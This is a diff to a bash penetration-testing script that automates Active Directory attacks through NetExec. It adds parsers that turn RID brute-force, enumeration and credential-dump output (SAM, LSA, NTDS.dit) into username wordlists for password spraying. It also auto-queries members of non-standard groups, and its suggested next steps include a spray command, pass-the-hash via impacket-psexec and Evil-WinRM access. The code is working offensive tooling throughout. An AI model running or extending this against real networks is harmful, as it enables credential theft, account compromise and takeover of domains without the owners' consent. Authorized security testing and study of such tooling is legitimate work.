@@ -122,6 +122,252 @@ section() {
     echo -e "${CYAN}======================================================${NC}"
 }
 
+# ============================================================
+# extract_users <output_file>
+# Parses nxc user-enumeration output lines and appends unique
+# usernames to $USER_LIST. Handles both SMB and LDAP formats:
+#   SMB   10.x  445  HOST  [+] DOMAIN\username
+#   LDAP  10.x  389  HOST  [*] username  (badPwdCount=0 ...)
+#   RID   10.x  445  HOST  500: DOMAIN\Administrator (SidTypeUser)
+# ============================================================
+extract_users() {
+    local src="$1"
+    [ -f "$src" ] || return
+
+    grep -Pio \
+        '(?<=\\\)[\w\.\-]+(?=\s)' \
+        "$src" 2>/dev/null >> "${OUTPUT_DIR}/_users_raw.txt"
+
+    # LDAP format: [*] username  or [+] username  (no backslash)
+    grep -Po '(?<=\[\*\]\s{1,6}|(?<=\[\+\]\s{1,6}))[\w\.\-]+(?=\s)' \
+        "$src" 2>/dev/null >> "${OUTPUT_DIR}/_users_raw.txt"
+
+    # RID format: 500: DOMAIN\username (SidTypeUser)
+    grep -Pio '(?<=\\)[\w\.\-]+(?=\s+\(SidTypeUser\))' \
+        "$src" 2>/dev/null >> "${OUTPUT_DIR}/_users_raw.txt"
+}
+
+# ============================================================
+# build_user_list
+# Deduplicates _users_raw.txt, removes known built-in accounts,
+# writes sorted users.txt and a wordlist-ready usernames.txt.
+# ============================================================
+BUILTIN_USERS=(
+    "Administrator" "Guest" "krbtgt" "DefaultAccount"
+    "WDAGUtilityAccount" "SYSTEM" "LOCAL SERVICE" "NETWORK SERVICE"
+)
+
+build_user_list() {
+    local raw="${OUTPUT_DIR}/_users_raw.txt"
+    [ -f "$raw" ] || return
+
+    local all_users
+    all_users=$(sort -u "$raw" | grep -v '^$')
+
+    # Separate built-ins from non-standard
+    local standard_users=()
+    local nonstandard_users=()
+
+    while IFS= read -r u; do
+        local is_builtin=0
+        for b in "${BUILTIN_USERS[@]}"; do
+            [[ "${u,,}" == "${b,,}" ]] && is_builtin=1 && break
+        done
+        if [ "$is_builtin" -eq 1 ]; then
+            standard_users+=("$u")
+        else
+            nonstandard_users+=("$u")
+        fi
+    done <<< "$all_users"
+
+    # Write combined users.txt (non-standard first, then built-ins)
+    USER_LIST="${OUTPUT_DIR}/users.txt"
+    {
+        echo "# ---- Non-standard / potentially interesting users ----"
+        printf '%s\n' "${nonstandard_users[@]}" | sort -u
+        echo ""
+        echo "# ---- Built-in / default accounts ----"
+        printf '%s\n' "${standard_users[@]}" | sort -u
+    } > "$USER_LIST"
+
+    # Wordlist-clean version (no comments, for spraying/cracking)
+    USERNAMES_WORDLIST="${OUTPUT_DIR}/usernames.txt"
+    printf '%s\n' "${nonstandard_users[@]}" "${standard_users[@]}" \
+        | grep -v '^#' | grep -v '^$' | sort -u > "$USERNAMES_WORDLIST"
+
+    echo -e "${GREEN}[+] User list written:${NC}"
+    echo -e "    ${USER_LIST}  (annotated)"
+    echo -e "    ${USERNAMES_WORDLIST}  (wordlist-clean)"
+    echo -e "${CYAN}    Total unique users: $(grep -vc '^#\|^$' "$USER_LIST" 2>/dev/null)${NC}"
+    if [ ${#nonstandard_users[@]} -gt 0 ]; then
+        echo -e "${MAGENTA}[*] Non-standard users (${#nonstandard_users[@]}):${NC}"
+        printf '    %s\n' "${nonstandard_users[@]}"
+    fi
+}
+
+# ============================================================
+# extract_groups <output_file> <source_label>
+# Parses nxc group-enumeration output and appends to the
+# combined _groups_raw.txt with a source label so you can
+# tell whether a group came from SMB or LDAP.
+#
+# nxc output looks like:
+#   LDAP  10.x  389  HOST  [+] Domain Admins  512
+#   SMB   10.x  445  HOST  [+] Administrators
+# ============================================================
+extract_groups() {
+    local src="$1"
+    local label="$2"   # e.g. "SMB" or "LDAP"
+    [ -f "$src" ] || return
+
+    # Strip leading protocol/IP/port/host noise, grab group name
+    # Lines: <PROTO>  <IP>  <PORT>  <HOST>  [+] <GroupName>  [<count>]
+    grep -Po '(?<=\[\+\]\s{1,10}).*' "$src" 2>/dev/null \
+        | sed 's/[[:space:]]*[0-9]*[[:space:]]*$//' \
+        | sed 's/[[:space:]]*$//' \
+        | grep -v '^$' \
+        | while IFS= read -r grp; do
+            echo "${label}|${grp}"
+          done >> "${OUTPUT_DIR}/_groups_raw.txt"
+}
+
+# ============================================================
+# BUILTIN_GROUPS — well-known Windows/AD built-in groups.
+# Anything NOT in this list is flagged as non-standard.
+# ============================================================
+BUILTIN_GROUPS=(
+    "Account Operators"
+    "Administrators"
+    "Allowed RODC Password Replication Group"
+    "Backup Operators"
+    "Certificate Service DCOM Access"
+    "Cert Publishers"
+    "Cloneable Domain Controllers"
+    "Cryptographic Operators"
+    "Denied RODC Password Replication Group"
+    "Distributed COM Users"
+    "DnsAdmins"
+    "DnsUpdateProxy"
+    "Domain Admins"
+    "Domain Computers"
+    "Domain Controllers"
+    "Domain Guests"
+    "Domain Users"
+    "Enterprise Admins"
+    "Enterprise Key Admins"
+    "Enterprise Read-only Domain Controllers"
+    "Event Log Readers"
+    "Group Policy Creator Owners"
+    "Guests"
+    "Hyper-V Administrators"
+    "IIS_IUSRS"
+    "Incoming Forest Trust Builders"
+    "Key Admins"
+    "Network Configuration Operators"
+    "Performance Log Users"
+    "Performance Monitor Users"
+    "Pre-Windows 2000 Compatible Access"
+    "Print Operators"
+    "Protected Users"
+    "RAS and IAS Servers"
+    "RDS Endpoint Servers"
+    "RDS Management Servers"
+    "RDS Remote Access Servers"
+    "Read-only Domain Controllers"
+    "Remote Desktop Users"
+    "Remote Management Users"
+    "Replicator"
+    "Schema Admins"
+    "Server Operators"
+    "Storage Replica Administrators"
+    "System Managed Accounts Group"
+    "Terminal Server License Servers"
+    "Users"
+    "Windows Authorization Access Group"
+    "WinRMRemoteWMIUsers__"
+)
+
+# ============================================================
+# build_group_list
+# Merges SMB + LDAP group data, deduplicates, separates
+# non-standard groups, writes groups.txt and nonstandard_groups.txt
+# ============================================================
+build_group_list() {
+    local raw="${OUTPUT_DIR}/_groups_raw.txt"
+    [ -f "$raw" ] || return
+
+    # Deduplicate by group name (case-insensitive), keep first source seen
+    declare -A seen_groups
+    declare -A group_sources
+
+    while IFS='|' read -r src grp; do
+        local key="${grp,,}"
+        if [ -z "${seen_groups[$key]+_}" ]; then
+            seen_groups[$key]="$grp"
+            group_sources[$key]="$src"
+        else
+            # Append additional source if different
+            if [[ "${group_sources[$key]}" != *"$src"* ]]; then
+                group_sources[$key]="${group_sources[$key]},${src}"
+            fi
+        fi
+    done < "$raw"
+
+    local standard=()
+    local nonstandard=()
+
+    for key in "${!seen_groups[@]}"; do
+        local grp="${seen_groups[$key]}"
+        local is_builtin=0
+        for b in "${BUILTIN_GROUPS[@]}"; do
+            [[ "${grp,,}" == "${b,,}" ]] && is_builtin=1 && break
+        done
+        if [ "$is_builtin" -eq 1 ]; then
+            standard+=("${group_sources[$key]}|${grp}")
+        else
+            nonstandard+=("${group_sources[$key]}|${grp}")
+        fi
+    done
+
+    IFS=$'\n' standard=($(sort <<<"${standard[*]}")); unset IFS
+    IFS=$'\n' nonstandard=($(sort <<<"${nonstandard[*]}")); unset IFS
+
+    GROUP_LIST="${OUTPUT_DIR}/groups.txt"
+    NONSTANDARD_GROUPS="${OUTPUT_DIR}/nonstandard_groups.txt"
+
+    {
+        echo "# FORMAT: SOURCE|GROUP_NAME"
+        echo "# SOURCE: SMB = local groups (SAM), LDAP = domain groups (AD)"
+        echo ""
+        echo "# ---- Non-standard / custom groups (investigate these) ----"
+        printf '%s\n' "${nonstandard[@]}"
+        echo ""
+        echo "# ---- Built-in / default groups ----"
+        printf '%s\n' "${standard[@]}"
+    } > "$GROUP_LIST"
+
+    # Clean nonstandard_groups.txt — group names only, no comments
+    printf '%s\n' "${nonstandard[@]}" \
+        | cut -d'|' -f2 \
+        | sort -u > "$NONSTANDARD_GROUPS"
+
+    echo -e "${GREEN}[+] Group lists written:${NC}"
+    echo -e "    ${GROUP_LIST}  (annotated, all groups)"
+    echo -e "    ${NONSTANDARD_GROUPS}  (non-standard groups only)"
+    echo -e "${CYAN}    Total unique groups: ${#seen_groups[@]}${NC}"
+
+    if [ ${#nonstandard[@]} -gt 0 ]; then
+        echo -e "${RED}[!!!] Non-standard groups found (${#nonstandard[@]}) — enumerate members:${NC}"
+        for entry in "${nonstandard[@]}"; do
+            local src="${entry%%|*}"
+            local grp="${entry#*|}"
+            echo -e "    ${MAGENTA}[${src}]${NC} ${grp}"
+        done
+    else
+        echo -e "${YELLOW}[!] No non-standard groups identified.${NC}"
+    fi
+}
+
 # ---- Parse args ----
 while getopts "t:u:p:H:d:o:nyh" opt; do
     case "$opt" in
@@ -232,9 +478,6 @@ run_nxc "List SMB shares as guest (local-auth)" \
 
 # ============================================================
 # STAGE 4c — Guest RID Brute Force
-# Attempts to enumerate users/groups via RID cycling using
-# the guest account (no password). Useful when null sessions
-# are blocked but guest is enabled.
 # ============================================================
 section "STAGE 4c: Guest RID Brute Force"
 
@@ -245,6 +488,10 @@ run_nxc "RID brute force as guest (500-1200)" \
 run_nxc "RID brute force as guest (local-auth, 500-1200)" \
     "${OUTPUT_DIR}/04c_guest_rid_brute_local" \
     smb "$TARGET" -u "guest" -p "" --local-auth --rid-brute 1200
+
+# Feed RID brute results into user extraction
+extract_users "${OUTPUT_DIR}/04c_guest_rid_brute.txt"
+extract_users "${OUTPUT_DIR}/04c_guest_rid_brute_local.txt"
 
 # ============================================================
 # STAGE 5 — User Enumeration
@@ -262,6 +509,11 @@ run_nxc "Enumerate RID brute (500-1200)" \
     "${OUTPUT_DIR}/05_rid_brute" \
     smb "$TARGET" "${AUTH_ARGS[@]}" --rid-brute 1200
 
+# Feed all user sources into extraction
+extract_users "${OUTPUT_DIR}/05_local_users.txt"
+extract_users "${OUTPUT_DIR}/05_users.txt"
+extract_users "${OUTPUT_DIR}/05_rid_brute.txt"
+
 # ============================================================
 # STAGE 6 — Group Enumeration
 # ============================================================
@@ -275,10 +527,30 @@ run_nxc "Enumerate domain groups" \
     "${OUTPUT_DIR}/06_groups" \
     ldap "$TARGET" "${AUTH_ARGS[@]}" --groups
 
+# Also pull groups via SMB for cross-validation and local scope
+run_nxc "Enumerate local groups via SMB" \
+    "${OUTPUT_DIR}/06_smb_local_groups" \
+    smb "$TARGET" "${AUTH_ARGS[@]}" --local-groups
+
+# Feed all group sources into extraction with source labels
+extract_groups "${OUTPUT_DIR}/06_local_groups.txt"  "LDAP-local"
+extract_groups "${OUTPUT_DIR}/06_groups.txt"         "LDAP-domain"
+extract_groups "${OUTPUT_DIR}/06_smb_local_groups.txt" "SMB-local"
+
+# ============================================================
+# STAGE 6 POST-PROCESSING — Build merged user & group lists
+# ============================================================
+section "STAGE 6 POST: Building User & Group Lists"
+
+build_user_list
+echo ""
+build_group_list
+
 # ============================================================
 # STAGE 6b — Group Member Enumeration
 # Parses group names from Stage 6 output, queries members
 # for each group. High-value groups are checked first.
+# Non-standard groups are also automatically included.
 # ============================================================
 section "STAGE 6b: Group Member Enumeration"
 
@@ -303,16 +575,24 @@ if [ -s "$GROUP_FILE" ]; then
     )
 
     # Parse all group names from nxc output
-    # nxc output lines look like: SMB/LDAP  10.x.x.x  445  HOST  [+] GROUP_NAME  (membercount)
     ALL_GROUPS=$(grep -oP '(?<=\]\s{1,10})\S.*?(?=\s+\d+$|\s*$)' "$GROUP_FILE" 2>/dev/null \
         | sed 's/[[:space:]]*$//' \
         | sort -u)
 
     if [ -z "$ALL_GROUPS" ]; then
-        # Fallback: try extracting the last quoted/word-group field per line
         ALL_GROUPS=$(awk '/\[\+\]/{for(i=NF;i>1;i--){if($i~/^[0-9]+$/){print substr($0, index($0,$2)); break}}}' "$GROUP_FILE" \
             | sed 's/[[:space:]]*[0-9]*[[:space:]]*$//' \
             | sort -u)
+    fi
+
+    # Append any non-standard groups not already in the parsed list
+    if [ -s "${OUTPUT_DIR}/nonstandard_groups.txt" ]; then
+        while IFS= read -r nsgrp; do
+            if ! echo "$ALL_GROUPS" | grep -qi "^${nsgrp}$"; then
+                ALL_GROUPS="${ALL_GROUPS}"$'\n'"${nsgrp}"
+            fi
+        done < "${OUTPUT_DIR}/nonstandard_groups.txt"
+        ALL_GROUPS=$(echo "$ALL_GROUPS" | sort -u)
     fi
 
     if [ -z "$ALL_GROUPS" ]; then
@@ -332,14 +612,35 @@ if [ -s "$GROUP_FILE" ]; then
                     "${OUTPUT_DIR}/06b_members_${safe_name}" \
                     ldap "$TARGET" "${AUTH_ARGS[@]}" --groups "$grp"
                 QUERIED+=("$grp")
+                extract_users "${OUTPUT_DIR}/06b_members_${safe_name}.txt"
             fi
         done
+
+        # --- Non-standard groups (highlighted separately) ---
+        if [ -s "${OUTPUT_DIR}/nonstandard_groups.txt" ]; then
+            echo ""
+            echo -e "${RED}[!!!] Querying non-standard groups first — these may be high-value:${NC}"
+            while IFS= read -r grp; do
+                already=0
+                for q in "${QUERIED[@]}"; do
+                    [[ "${q,,}" == "${grp,,}" ]] && already=1 && break
+                done
+                [ "$already" -eq 1 ] && continue
+
+                safe_name=$(echo "$grp" | tr ' ' '_' | tr -cd '[:alnum:]_-')
+                echo -e "${RED}[*] Non-standard group: ${grp}${NC}"
+                run_nxc "Members of non-standard group '${grp}'" \
+                    "${OUTPUT_DIR}/06b_members_NONSTANDARD_${safe_name}" \
+                    ldap "$TARGET" "${AUTH_ARGS[@]}" --groups "$grp"
+                QUERIED+=("$grp")
+                extract_users "${OUTPUT_DIR}/06b_members_NONSTANDARD_${safe_name}.txt"
+            done < "${OUTPUT_DIR}/nonstandard_groups.txt"
+        fi
 
         # --- Remaining groups ---
         echo ""
         echo -e "${CYAN}[*] Querying remaining groups...${NC}"
         while IFS= read -r grp; do
-            # Skip if already queried
             already=0
             for q in "${QUERIED[@]}"; do
                 [[ "${q,,}" == "${grp,,}" ]] && already=1 && break
@@ -350,10 +651,16 @@ if [ -s "$GROUP_FILE" ]; then
             run_nxc "Members of '${grp}'" \
                 "${OUTPUT_DIR}/06b_members_${safe_name}" \
                 ldap "$TARGET" "${AUTH_ARGS[@]}" --groups "$grp"
+            extract_users "${OUTPUT_DIR}/06b_members_${safe_name}.txt"
         done <<< "$ALL_GROUPS"
 
         echo ""
         echo -e "${GREEN}[+] Group member enumeration complete. Files: ${OUTPUT_DIR}/06b_members_*.txt${NC}"
+
+        # Rebuild user list now that member outputs are ingested
+        echo ""
+        echo -e "${CYAN}[*] Rebuilding user list with group member data...${NC}"
+        build_user_list
     fi
 else
     echo -e "${YELLOW}[!] No group output found at ${GROUP_FILE}. Run Stage 6 first or check credentials.${NC}"
@@ -380,6 +687,9 @@ run_nxc "Logged-on users" \
 run_nxc "Active sessions" \
     "${OUTPUT_DIR}/08_sessions" \
     smb "$TARGET" "${AUTH_ARGS[@]}" --sessions
+
+extract_users "${OUTPUT_DIR}/08_loggedon.txt"
+extract_users "${OUTPUT_DIR}/08_sessions.txt"
 
 # ============================================================
 # STAGE 9 — WINRM (if available)
@@ -419,12 +729,18 @@ run_nxc "Find AD CS (certificate services)" \
     "${OUTPUT_DIR}/10_adcs" \
     ldap "$TARGET" "${AUTH_ARGS[@]}" -M adcs
 
+# Feed Stage 10 LDAP user/group outputs
+extract_users  "${OUTPUT_DIR}/10_ldap_users.txt"
+extract_groups "${OUTPUT_DIR}/10_ldap_groups.txt" "LDAP-domain"
+
+# Final user + group list rebuild with all Stage 10 data
+echo ""
+echo -e "${CYAN}[*] Final user & group list rebuild (post-LDAP)...${NC}"
+build_user_list
+build_group_list
+
 # ============================================================
 # STAGE 10b — ASREPRoast & Kerberoast
-# Run separately, bypassing run_nxc to avoid arg ordering
-# issues with hash output file paths. ASREPRoast requires
-# domain context (-d) for correct REALM in AS-REQ.
-# Kerberoasting requires valid credentials (needs a TGT).
 # ============================================================
 section "STAGE 10b: ASREPRoast & Kerberoast"
 
@@ -486,6 +802,16 @@ run_nxc "LSA secrets dump (requires admin)" \
 run_nxc "NTDS.dit dump — Domain Controller only (requires DA)" \
     "${OUTPUT_DIR}/12_ntds" \
     smb "$TARGET" "${AUTH_ARGS[@]}" --ntds 2>/dev/null
+
+# Extract users from credential dumps — these are goldmines
+extract_users "${OUTPUT_DIR}/12_sam_dump.txt"
+extract_users "${OUTPUT_DIR}/12_lsa_dump.txt"
+extract_users "${OUTPUT_DIR}/12_ntds.txt"
+
+# Final rebuild after dump outputs
+echo ""
+echo -e "${CYAN}[*] Rebuilding user list with dump data...${NC}"
+build_user_list
 
 # ============================================================
 # STAGE 13 — Useful Modules
@@ -568,15 +894,39 @@ if grep -ql "SidTypeUser\|SidTypeGroup" "${OUTPUT_DIR}/04c_guest_rid_brute_local
     echo -e "${RED}[!!!] Guest RID brute (local-auth) yielded users/groups: ${OUTPUT_DIR}/04c_guest_rid_brute_local.txt${NC}"
 fi
 
+# Non-standard group quick-win
+if [ -s "${OUTPUT_DIR}/nonstandard_groups.txt" ]; then
+    echo -e "${RED}[!!!] Non-standard groups identified — review member files:${NC}"
+    while IFS= read -r grp; do
+        safe_name=$(echo "$grp" | tr ' ' '_' | tr -cd '[:alnum:]_-')
+        f="${OUTPUT_DIR}/06b_members_NONSTANDARD_${safe_name}.txt"
+        if [ -s "$f" ]; then
+            echo -e "    ${MAGENTA}${grp}${NC}: ${f}"
+        else
+            echo -e "    ${YELLOW}${grp}${NC} (no member output — may need creds or domain context)"
+        fi
+    done < "${OUTPUT_DIR}/nonstandard_groups.txt"
+fi
+
+# User list summary
+if [ -s "${OUTPUT_DIR}/users.txt" ]; then
+    total=$(grep -vc '^#\|^$' "${OUTPUT_DIR}/users.txt" 2>/dev/null)
+    echo -e "${GREEN}[+] Users enumerated: ${total} — ${OUTPUT_DIR}/users.txt${NC}"
+    echo -e "    Wordlist-clean:  ${OUTPUT_DIR}/usernames.txt"
+fi
+
 echo ""
 echo -e "${YELLOW}[*] Suggested next steps:${NC}"
-echo "    - Review shares:    cat ${OUTPUT_DIR}/04_smb_shares.txt"
+echo "    - Review users:        cat ${OUTPUT_DIR}/users.txt"
+echo "    - Spray users:         cat ${OUTPUT_DIR}/usernames.txt"
+echo "    - Review non-std groups: cat ${OUTPUT_DIR}/nonstandard_groups.txt"
+echo "    - Review all groups:   cat ${OUTPUT_DIR}/groups.txt"
+echo "    - Review shares:       cat ${OUTPUT_DIR}/04_smb_shares.txt"
 echo "    - Review guest shares: cat ${OUTPUT_DIR}/04b_guest_shares.txt"
-echo "    - Review groups:    cat ${OUTPUT_DIR}/06_groups.txt"
 echo "    - Review group members: cat ${OUTPUT_DIR}/06b_members_Domain_Admins.txt"
-echo "    - Review users:     cat ${OUTPUT_DIR}/05_users.txt"
-echo "    - Evil-WinRM:       evil-winrm -i ${TARGET} -u <user> -p <pass>"
-echo "    - Impacket PTH:     impacket-psexec <user>@${TARGET} -hashes :<NThash>"
-echo "    - BloodHound ingest: bloodhound-python -u <user> -p <pass> -d <domain> -ns ${TARGET} -c all"
+echo "    - Evil-WinRM:          evil-winrm -i ${TARGET} -u <user> -p <pass>"
+echo "    - Impacket PTH:        impacket-psexec <user>@${TARGET} -hashes :<NThash>"
+echo "    - BloodHound ingest:   bloodhound-python -u <user> -p <pass> -d <domain> -ns ${TARGET} -c all"
+echo "    - Password spray:      nxc smb ${TARGET} -u ${OUTPUT_DIR}/usernames.txt -p <password> --continue-on-success"
 echo ""
 echo -e "${GREEN}[+] All results saved to: ${OUTPUT_DIR}/${NC}"
